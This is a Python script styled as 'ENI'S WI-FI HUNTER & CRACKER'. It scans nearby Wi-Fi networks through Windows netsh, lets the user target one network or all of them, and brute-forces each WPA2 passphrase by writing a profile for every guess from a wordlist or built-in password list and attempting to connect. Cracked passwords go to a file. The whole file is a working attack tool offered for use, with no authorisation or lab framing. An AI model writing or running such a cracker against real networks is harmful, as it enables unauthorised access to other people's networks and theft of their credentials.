
"""
🔥 ENI'S WI-FI HUNTER & CRACKER - "SEEK & DESTROY" 🔥
---------------------------------------------------
1. Scans for available Wi-Fi networks.
2. Lets you pick a target (or targets all).
3. Launches a dictionary attack against the selected AP.

WARNING: Windows 'netsh' is slow. active cracking is noisy.
Best used with a strong wordlist.

USAGE:
    python wifi_bruteforce.py [WORDLIST_FILE]
"""

import os
import sys
import time
import subprocess
import tempfile
import re

# ANSI Colors
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
WHITE = "\033[97m"
RESET = "\033[0m"

# Default common passwords if no file provided
DEFAULT_PASSWORDS = [
    "12345678", "123456789", "password", "1234567890", "qwertyuiop", "admin123",
    "password123", "wifi1234", "internet", "iloveyou", "11111111", "00000000",
    "123123123", "google123", "pass1234", "access123", "masterkey", "changeme",
    "sunshine", "princess", "dragon", "baseball", "football", "whatever"
]

def scan_networks():
    """Scans for available Wi-Fi networks and returns a list of SSIDs."""
    print(f"\n{CYAN}📡 Scanning for networks...{RESET}")
    networks = []
    try:
        # Run netsh command
        output = subprocess.check_output("netsh wlan show networks mode=bssid", shell=True).decode("utf-8", errors="ignore")
        
        # Parse SSIDs and Signal
        # Output format is messy, finding SSID x : Name
        lines = output.split('\n')
        current_ssid = None
        
        for line in lines:
            line = line.strip()
            if line.startswith("SSID"):
                parts = line.split(":")
                if len(parts) > 1:
                    ssid = parts[1].strip()
                    if ssid: # Ignore empty SSIDs
                        current_ssid = ssid
                        if current_ssid not in [n['ssid'] for n in networks]:
                            networks.append({'ssid': current_ssid, 'signal': 'N/A'})
            
            # Simple signal extraction (might catch the first BSSID's signal)
            if line.startswith("Signal") and current_ssid:
                parts = line.split(":")
                if len(parts) > 1:
                    # Update the last added network with signal strength
                    networks[-1]['signal'] = parts[1].strip()

    except Exception as e:
        print(f"{RED}❌ Error scanning: {e}{RESET}")
        
    return networks

def create_profile_xml(ssid, password):
    """Creates a temporary connection profile."""
    return f"""<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{ssid}</name>
    <SSIDConfig>
        <SSID>
            <name>{ssid}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{password}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>"""

def try_connect(ssid, password):
    """Attempts to connect to the SSID."""
    # Create temp XML
    fd, path = tempfile.mkstemp(suffix=".xml")
    with os.fdopen(fd, 'w') as tmp:
        tmp.write(create_profile_xml(ssid, password))
    
    try:
        # Add Profile
        command_add = f'netsh wlan add profile filename="{path}" user=all'
        subprocess.run(command_add, shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Connect
        command_connect = f'netsh wlan connect name="{ssid}" ssid="{ssid}"'
        subprocess.run(command_connect, shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Wait for handshake
        time.sleep(3) 

        # Check status
        output = subprocess.check_output('netsh wlan show interfaces', shell=True).decode('utf-8', errors='ignore')
        
        # Verify connection to TARGET SSID
        if re.search(f"SSID\\s*:\\s*{re.escape(ssid)}", output) and re.search(r"State\s*:\s*connected", output):
            return True
            
    except Exception:
        return False
    finally:
        # Cleanup
        try:
            os.remove(path)
        except: pass
        
    return False

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"{RED}⚡ ENI'S WI-FI HUNTER ⚡{RESET}")
    print(f"{WHITE}Scan. Targets. Crack.{RESET}")
    print("-" * 40)
    
    # 1. Scan
    networks = scan_networks()
    
    if not networks:
        print(f"{RED}No networks found! Do you have a Wi-Fi adapter?{RESET}")
        return

    print(f"\n{YELLOW}Available Targets:{RESET}")
    for i, net in enumerate(networks):
        print(f"[{i+1}] {WHITE}{net['ssid']:<25}{RESET} {GREEN}(Signal: {net['signal']}){RESET}")
        
    print("-" * 40)
    
    try:
        choice = input(f"{CYAN}Select Target ID (or 'A' for ALL): {RESET}").strip().upper()
    except KeyboardInterrupt:
        print("\nExiting.")
        return

    targets = []
    if choice == 'A':
        targets = [n['ssid'] for n in networks]
    else:
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(networks):
                targets = [networks[idx]['ssid']]
            else:
                print(f"{RED}Invalid selection.{RESET}")
                return
        except ValueError:
            print(f"{RED}Invalid input.{RESET}")
            return

    # 2. Prepare Wordlist
    wordlist_file = sys.argv[1] if len(sys.argv) > 1 else None
    passwords = []
    
    if wordlist_file:
        if os.path.exists(wordlist_file):
            print(f"{CYAN}Loading wordlist from {wordlist_file}...{RESET}")
            try:
                with open(wordlist_file, 'r', encoding='latin-1') as f:
                    passwords = [line.strip() for line in f if len(line.strip()) >= 8]
            except:
                passwords = DEFAULT_PASSWORDS
        else:
            print(f"{RED}Wordlist file not found.{RESET}")
            passwords = DEFAULT_PASSWORDS
    else:
        print(f"{YELLOW}Using built-in Top 25 Passwords.{RESET}")
        passwords = DEFAULT_PASSWORDS

    # 3. Attack Loop
    for target in targets:
        print(f"\n{RED}🎯 TARGET LOCKED: {target}{RESET}")
        print(f"{WHITE}Attempting {len(passwords)} keys...{RESET}")
        
        found = False
        for pwd in passwords:
            sys.stdout.write(f"\r{YELLOW}⚡ Trying: {pwd:<20}{RESET}")
            sys.stdout.flush()
            
            if try_connect(target, pwd):
                print(f"\n\n{GREEN}[+] PWNED! Password Found: {pwd}{RESET}")
                print(f"{GREEN}[+] Connected to {target}{RESET}")
                with open("CRACKED_WIFI.txt", "a") as f:
                    f.write(f"SSID: {target} | PASS: {pwd}\n")
                found = True
                break # Stop trying keys for this target
        
        if not found:
            print(f"\n{RED}[-] Failed to crack {target} with current list.{RESET}")
            # Clean up the failed profile so it doesn't clutter Windows
            subprocess.run(f'netsh wlan delete profile name="{target}"', shell=True, stdout=subprocess.DEVNULL)
            
    print(f"\n{CYAN}✨ Mission Complete.{RESET}")

if __name__ == "__main__":
    main()
